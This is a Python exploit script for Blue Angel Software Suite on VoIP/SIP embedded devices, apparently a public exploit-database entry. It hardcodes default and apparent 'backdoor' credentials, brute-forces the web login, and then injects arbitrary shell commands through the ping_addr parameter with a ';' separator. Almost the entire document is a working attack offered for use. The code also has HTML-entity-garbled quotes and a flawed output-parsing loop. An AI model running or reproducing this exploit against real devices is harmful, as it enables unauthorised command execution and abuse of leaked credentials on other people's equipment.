# Exploit Author: Paolo Serracino 
# Vendor Homepage: http://www.5vtechnologies.com
# Software Link: N/A
# Version: All
# Tested on: Embedded Linux OS
# CVE : N/A
# Description: Blue Angel Software Suite, an application that runs on embedded devices for VOIP/SIP services is vulnerable to an authenticated 
# command execution in ping command. All default accounts can be used to login and achieve command execution, including the guest one. 
# Moreover there&#039;s another account, defined in the local file device.dat, that provides an apparently "backdoor" account.
# A list of these accounts is hardcoded in the script.

#/usr/bin/python
import sys
import requests


def check_sw(target,port):

  res = requests.get(target + &#039;:&#039; + port)

  if &#039;/cgi-bin/webctrl.cgi?action=index_page&#039; in res.text:
     return True
  else:
     print "[-] DOES NOT LOOK LIKE THE PAGE WE&#039;RE LOOKING FOR"
     return False

def check_login(target,port,command):

   if not check_sw(target,port):
      sys.exit()

   creds_common = [(&#039;blueangel&#039;,&#039;blueangel&#039;), #the "backdoor" account
                   (&#039;root&#039;,&#039;abnareum10&#039;),
                   (&#039;root&#039;,&#039;Admin@tbroad&#039;),
                   (&#039;root&#039;,&#039;superuser&#039;),
                   (&#039;user&#039;,&#039;user&#039;) ,
                   (&#039;guest&#039;,&#039;guest&#039;),
                   ]
 
   for i in range(len(creds_common)):
      postdata=[(&#039;action&#039;,&#039;login_authentication&#039;),
               (&#039;redirect_action&#039;,&#039;sysinfo_page&#039;),
               (&#039;login_username&#039;,creds_common[i][0]),
               (&#039;login_password&#039;,creds_common[i][1]),
               (&#039;B1&#039;,&#039;Login&#039;)
               ]

      res = requests.post(target + &#039;:&#039; + port + &#039;/cgi-bin/webctrl.cgi&#039;,data=postdata)

      if &#039;Set-Cookie&#039; in res.headers:
         cookie = res.headers.get(&#039;Set-Cookie&#039;)
         print &#039;[+] LOGGED IN WITH CREDENTIALS  &#039; + str(creds_common[i][0] + &#039; : &#039; + creds_common[i][1]) 
         execute_cmd(target,port,cookie,command)  
         return True


def execute_cmd(target,port,cookie,cmd):

   print &#039;[+] EXECUTING COMMAND&#039;
   new_headers = ({&#039;User-Agent&#039;:&#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)&#039;,
                 &#039;Referer&#039;: target,
                 &#039;Cookie&#039;: cookie
                })
   res = requests.get(target + &#039;:&#039; + port + &#039;/cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1;&#039; + cmd + &#039;&B1=PING&#039;,headers=new_headers)
   res_lines = res.text.splitlines()
   result = []
   copy = False

   for line in res_lines:

      if &#039;round-trip min/avg/max&#039; in line:
         copy = True
         copy = False
      elif copy == True:
         result.append(line)

   print(&#039;[+] COMMAND RESPONSE&#039;)
   print(&#039;------------------------------------------&#039;)

   for r in result:
      print r
   print(&#039;------------------------------------------&#039;)


def main():

   if len(sys.argv) < 4:
      print &#039;[-] 3 ARGS: TARGET PORT SHELL_COMMAND&#039;
      sys.exit()
   
   target = sys.argv[1]   
   port = sys.argv[2]
   command = sys.argv[3]
   if not check_login(target,port,command):
      print &#039;[-] COULD NOT FIND VALID CREDENTIALS&#039;
      
if __name__ == "__main__":
    main()

